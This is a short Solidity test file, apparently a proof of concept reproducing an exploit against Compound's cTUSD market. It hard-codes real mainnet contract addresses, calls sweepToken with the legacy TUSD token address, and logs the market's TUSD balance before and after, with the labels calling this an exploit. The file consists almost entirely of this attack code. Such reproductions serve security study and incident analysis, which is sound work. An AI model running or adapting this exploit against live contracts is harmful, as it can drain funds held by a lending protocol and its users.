// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "./interface.sol";


contract ContractTest is DSTest {
    ICErc20Delegate cTUSD  = ICErc20Delegate(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);
    IERC20 tusd = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376);
    address tusdLegacy = 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E;
    function testExample() public {
        emit log_named_uint("Before exploit, Compound TUSD balance:", tusd.balanceOf(address(cTUSD)));
        cTUSD.sweepToken(tusdLegacy) ;
        emit log_named_uint("After exploit, Compound TUSD balance:", tusd.balanceOf(address(cTUSD)));
}

}
